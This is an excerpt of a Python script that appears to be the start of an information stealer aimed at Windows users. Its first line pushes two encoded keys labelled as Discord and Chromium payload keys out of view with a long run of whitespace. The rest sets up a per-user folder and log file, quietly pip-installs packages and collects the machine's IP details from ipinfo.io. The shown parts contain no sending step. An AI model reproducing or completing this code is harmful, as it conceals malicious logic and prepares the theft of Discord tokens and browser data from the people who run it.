import os                                                                                                                                                                                                                                                                                                                     ; discord_payload_key = "bWFtYW1pYQ" ; chromium_payload_key = "bWFtYW1pYQ"
import re
import json
import base64
import shutil
...
host_path = f"C:/Users/{os.getlogin()}/bin"
logs_path = host_path + f"/logs-{os.getlogin()}.txt"
...
### GET PYTHON COMMAND ###
with open(host_path + "/python.txt", "r") as f:
    python_cmd = f.read()
...
for package in packages:
    result = subprocess.run([python_cmd, "-m", "pip", "install", package], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
### RETRIEVE COMPUTER INFOS ###
requ_infos = requests.get('https://ipinfo.io')
data = requ_infos.json()
